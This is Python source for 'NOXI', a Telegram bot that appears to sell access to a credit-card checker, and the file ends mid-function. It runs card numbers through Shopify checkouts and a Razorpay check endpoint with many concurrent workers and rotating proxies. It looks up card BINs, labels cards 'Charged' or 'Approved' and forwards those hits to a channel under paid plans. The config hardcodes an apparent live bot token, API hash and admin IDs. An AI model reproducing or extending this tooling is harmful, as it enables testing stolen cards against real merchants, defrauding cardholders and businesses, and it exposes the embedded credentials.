# bot.py – NOXI Bot (Full Version)
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import socket
import platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List
from telethon.errors import (
    UserNotParticipantError,
    ChatAdminRequiredError,
    ChannelPrivateError,
)
import httpx

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db, db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    mark_user_joined, is_user_marked_joined, remove_joined_mark
)

from emojis import PREMIUM_EMOJI_IDS

# ====================== PREMIUM EMOJI HELPER ======================
def pe(text: str) -> str:
    """Replace standard emojis with custom premium emoji tags."""
    if not text:
        return text
    result = text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ====================== COLORED BUTTONS ======================
def colored_button(text: str, data: str, style: str = "primary") -> Button:
    return Button.inline(text, data.encode(), style=style)

def colored_url_button(text: str, url: str, style: str = "primary") -> Button:
    return Button.url(text, url, style=style)

# ====================== LOGGING ======================
log = logging.getLogger("NOXI")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('noxi_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except:
    pass

def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")

def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")

# ====================== BOLD SANS CONVERTER ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper):
    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower):
    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits):
    _BOLD_SANS_MAP[_c] = _bold_digits[_i]

def bs(text):
    if not text: return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID", "33657928"))
API_HASH = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8517366800:AAGbU4pTheYVVCqMLYDqGvot4pa4FCGQhSw")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[5826575488, 8871910561]"))
HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1003965573664"))
JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "-1004381920430"))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "-1003902938287"))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/+_0kBIVQujUEyOTc1")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/+3dlEoWK-vGcwMDI9")
FORCE_JOIN_IMAGES = ["", ""]

CHECKER_API_URL = os.getenv("CHECKER_API_URL", "http://localhost:8099")
CHECKER_TIMEOUT = int(os.getenv("CHECKER_TIMEOUT", "30"))
RAZORPAY_API_URL = os.getenv("RAZORPAY_API_URL", "https://web-production-43fc5.up.railway.app/razorpay/check")
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ── Worker Configuration ──
SP_PER_USER_WORKERS = 30
MSP_PER_USER_WORKERS = 70
RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50
SITE_PER_USER_WORKERS = 30
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

API_TIMEOUT = 60
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12
RZ_TIMEOUT = 60

BATCH_SIZE = 60
SITE_CHECK_BATCH = 40
HIT_DELAY = 1.5
PER_USER_LIMIT = 200
LOG_CHANNEL_ID = HIT_CHANNEL_ID

FREE_SP_DAILY_LIMIT = 15
FREE_SP_COOLDOWN = 10

PLANS = {
    "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)

def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS,
            "mrz": MRZ_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
        }
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]

def cleanup_user_sem(uid):
    keys_to_remove = [k for k in _USER_SEMS if k.startswith(f"{uid}_")]
    for k in keys_to_remove:
        del _USER_SEMS[k]

CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
}
PE = "⭐"

ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MRZ_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}

BOT_START_TIME = time.time()

HIT_BUTTON = [[Button.url(bs("NOXI"), "https://t.me/NOXI_Bot")]]

_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None

# ---------- HTTPX client for local checker ----------
_checker_client: httpx.AsyncClient | None = None
_checker_lock = asyncio.Lock()

async def _get_checker_client() -> httpx.AsyncClient:
    global _checker_client
    async with _checker_lock:
        if _checker_client is None or _checker_client.is_closed:
            _checker_client = httpx.AsyncClient(
                timeout=httpx.Timeout(CHECKER_TIMEOUT, connect=5.0),
                limits=httpx.Limits(max_connections=200, max_keepalive_connections=50)
            )
    return _checker_client

# ============ LOCAL BIN DATABASE ============
_BIN_DB = {}
_BIN_DB_LOADED = False
_BIN_DB_PATH = os.path.join(os.path.dirname(__file__), "data", "bins.json.gz")
_BIN_HTTP_CACHE = {}

def _load_bin_db():
    global _BIN_DB, _BIN_DB_LOADED
    if _BIN_DB_LOADED:
        return
    if not os.path.exists(_BIN_DB_PATH):
        _BIN_DB_LOADED = True
        return
    try:
        import gzip
        with gzip.open(_BIN_DB_PATH, "rt", encoding="utf-8") as f:
            _BIN_DB = json.load(f)
        _BIN_DB_LOADED = True
        log_system("BIN", f"Loaded {len(_BIN_DB)} BINs from local DB")
    except Exception as e:
        log_system("BIN", f"Failed to load BIN DB: {e}", "error")
        _BIN_DB_LOADED = True

def _bin_lookup(bin6: str):
    entry = _BIN_DB.get(bin6) or _BIN_DB.get(bin6[:6])
    if entry and isinstance(entry, list) and len(entry) == 6:
        return tuple(entry)
    return None

async def get_bin_info(cn):
    _load_bin_db()
    bin6 = cn[:6]
    hit = _bin_lookup(bin6)
    if hit:
        brand, btype, level, bank, country, flag = hit
        return {"brand": brand, "type": btype, "level": level, "bank": bank, "country": country, "flag": flag}
    if bin6 in _BIN_HTTP_CACHE:
        brand, btype, level, bank, country, flag = _BIN_HTTP_CACHE[bin6]
        return {"brand": brand, "type": btype, "level": level, "bank": bank, "country": country, "flag": flag}
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{bin6}') as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    result = {
                        "brand": d.get('brand', '-'),
                        "type": d.get('type', '-'),
                        "level": d.get('level', '-'),
                        "bank": d.get('bank', '-'),
                        "country": d.get('country_name', '-'),
                        "flag": d.get('country_flag', '🏳️')
                    }
                    _BIN_HTTP_CACHE[bin6] = (result["brand"], result["type"], result["level"], result["bank"], result["country"], result["flag"])
                    if len(_BIN_HTTP_CACHE) > 2000:
                        for k in list(_BIN_HTTP_CACHE)[:500]:
                            _BIN_HTTP_CACHE.pop(k, None)
                    return result
    except:
        pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}

# ====================== OTHER HELPERS ======================
async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        timeout_val = RZ_TIMEOUT if purpose in ("rz", "mrz") else API_TIMEOUT
        connector = aiohttp.TCPConnector(
            limit=150,
            limit_per_host=50,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
        )
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout_val, connect=10),
            connector=connector,
        )
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try:
            await session.close()
        except:
            pass

async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_BIN_SESSION

async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15),
            connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_PROXY_SESSION

# ====================== FREE USER DAILY TRACKER ======================
def _get_today_key():
    return datetime.now().strftime("%Y-%m-%d")

def get_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
        return 0
    return entry["count"]

def increment_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
    else:
        _FREE_SP_USAGE[user_id]["count"] += 1

def get_free_sp_cooldown_remaining(user_id):
    last = _FREE_SP_LAST_USE.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_SP_COOLDOWN:
        return 0
    return round(FREE_SP_COOLDOWN - elapsed, 1)

def set_free_sp_last_use(user_id):
    _FREE_SP_LAST_USE[user_id] = time.time()

# ====================== SMART ROTATION ENGINE ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
        self._site_idx = 0
        self._proxy_idx = 0

    def pick_site(self, sites, exclude=None):
        if not sites:
            return None
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available:
            available = [s for s in sites if s not in exclude]
        if not available:
            available = list(sites)
        self._site_idx = (self._site_idx + 1) % len(available)
        return available[self._site_idx]

    def pick_proxy(self, proxies, exclude=None):
        if not proxies:
            return None
        exclude = exclude or set()
        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        if not available:
            available = [p for p in proxies if p.get('proxy_url') not in exclude]
        if not available:
            available = list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(available)
        return available[self._proxy_idx]

    def report_site_ok(self, site):
        self._site_fails[site] = 0

    def report_site_fail(self, site):
        self._site_fails[site] = self._site_fails.get(site, 0) + 1

    def report_proxy_ok(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = 0

    def report_proxy_fail(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1

# ====================== SITE ERROR DETECTION ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found',
    'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail', 'tax ammount empty', 'tax amount empty',
    'tax amount is empty', 'del ammount empty', 'site not supported for now',
    'payment base card not supported', 'no product found', 'checkout is not available',
    'cart is empty', 'cart add failed after retries', 'checkout_expired',
    'checkout_not_found', 'no shipping methods available', 'site error', 'site dead',
    'site errors', 'server error', 'internal server error',
    'internal_server_error', 'application error', 'unexpected error',
    'something went wrong', 'error in 1st req', 'error in 1 req',
    'error processing card', 'we could not process', 'unable to process',
    'payment provider error', 'payment gateway error', 'session expired',
    'session invalid', 'failed after retries', 'max retries exceeded',
    'all sites dead', 'all sites unavailable', 'processinf error', 'handle error',
    'nonetype', "nonetype' object has no attribute 'get", 'unknown error',
    'unknown_error', 'unknown_result', 'utm_source', 'shop is unavailable',
    'store is unavailable', 'store not found', 'page not found',
    'this store is unavailable', 'this shop is currently unavailable',
    'password protected', 'enter store using password', 'storefront is password protected',
    'shop closed', 'store closed', 'delivery_delivery_line_detail_changed',
    'delivery_address2_required', 'delivery_line_detail_changed', 'delivery_line',
    'delivery_address', 'address_required', 'submit_rejected',
    'submit rejected:', 'change proxy or site', 'change site',
    'fake charge gate', 'fake gate',
    'hcaptcha detected', 'hcaptcha_detected', 'captcha at checkout',
    'captcha_required', 'captcha required', 'cloudflare',
    'access denied', 'permission denied',
    'connection error', 'connection failed', 'timed out', 'timeout',
    'could not resolve host', 'connect tunnel failed', 'unreachable',
    'network error', 'connection reset', 'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'api_timeout',
    'http error', 'httperror504', '502', '503', '504',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'site error! status: 404', 'site error! status: 401',
    'amount_too_small', 'amount too small', 'merchandise_not_enough_stock',
    'product out of stock', 'malformed input', 'url rejected',
    'invalid_response',
    'cart failed with status', 'invalid json response', 'invalid json',
    'inventoryreservationfailure', 'inventory_reservation_failure',
    'payments_positive_amount_expec', 'payments_payment_flexibility_t',
    'payments_credit_card_brand_not', 'buyer_identity_presentment_currency',
    "'products'", "error:", "error: '",
    'unable to get payment token',
    'empty submit response',
    'empty submit',
    'order_total_changed',
    'order total changed',
    'invalid_payment_method',
    'invalid payment method',
    'validation_custom',
    'validation custom',
    'ARTIFACT_DISSATISFACTION',
    'artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED',
    'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR',
    'processing_error',
    'DELIVERY_COMPANY_REQUIRED',
    'delivery_company_required',
    'DECISION_RULE_BLOCK',
    'decision_rule_block',
    'timeout'
]

PROXY_ERROR_KEYWORDS = [
    'proxy dead', 'proxy error', 'proxy timeout',
    'proxy connection failed', 'proxy refused',
]

RZ_RETRY_KEYWORDS = [
    'payment id not found', 'payment_id_not_found',
    'timeout', 'timed out', 'connection error',
    'connection failed', 'connection reset',
    'server error', 'internal server error',
    '502', '503', '504', 'bad gateway',
    'service unavailable', 'gateway timeout',
    'empty reply', 'invalid json',
    'could not resolve host', 'network error',
    'ssl routines', 'unreachable',
    'proxy dead', 'proxy error', 'proxy timeout',
    'DEAD | Payment ID not found', 'timeout',
]

def is_site_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    if lower == 'na':
        return True
    if "no product under" in lower:
        return False
    if "redirected to thank you" in lower:
        return False
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS)

def is_proxy_error(text):
    if not text:
        return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)

def is_rz_retry_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    return any(kw in lower for kw in RZ_RETRY_KEYWORDS)

def is_truly_alive(response, price):
    if not response:
        return False
    lower = response.lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    try:
        pv = float(pc)
    except:
        pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json',
           'inventoryreservationfailure', 'payments_positive_amount',
           'payments_payment_flexibility', 'payments_credit_card_brand']
    for b in bad:
        if b in lower:
            return False
    if pv == 0.0:
        normal = ['card_declined', 'card declined', 'generic_decline', 'generic decline',
                   'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
                   'stolen_card', 'lost_card', 'expired_card', 'expired card',
                   'otp_required', 'otp required', '3d', 'authentication',
                   'cvc', 'ccn', 'generic_error', 'generic error',
                   'restricted_card', 'fraudulent', 'not_permitted',
                   'transaction_not_allowed', 'card_not_supported']
        if not any(n in lower for n in normal):
            return False
    return True

def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url

# ====================== MESSAGE SYSTEM ======================
client_instance = None

def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except asyncio.TimeoutError:
        return None
    except:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False),
                timeout=10
            )
        except:
            return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except:
        return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(
            msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False),
            timeout=8
        )
    except:
        pass

def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ====================== CARD FORMATTING ======================
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_card_result_no_price(status, card, gateway, response, bin_info=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>""", he

def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/SUPERGREMLIN01'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

# ====================== FORCE JOIN ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600:
        return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned):
                return False
        except UserNotParticipantError:
            return False
        except (ChatAdminRequiredError, ChannelPrivateError):
            pass
        except:
            pass
    _JOIN_CACHE[user_id] = now
    return True

async def force_join_check(event):
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    _JOIN_CACHE.pop(event.sender_id, None)
    await remove_joined_mark(event.sender_id)
    buttons = [
        [pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK)],
        [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK)],
        [pbtn(bs("I have joined"), data="check_joined")]
    ]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('NOXI CHANNEL')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('NOXI Chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    try:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]], file=random.choice(FORCE_JOIN_IMAGES))
    except:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]])
    return False

# ====================== MAINTENANCE ======================
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except:
        pass

async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except:
        return False

async def check_maintenance(event):
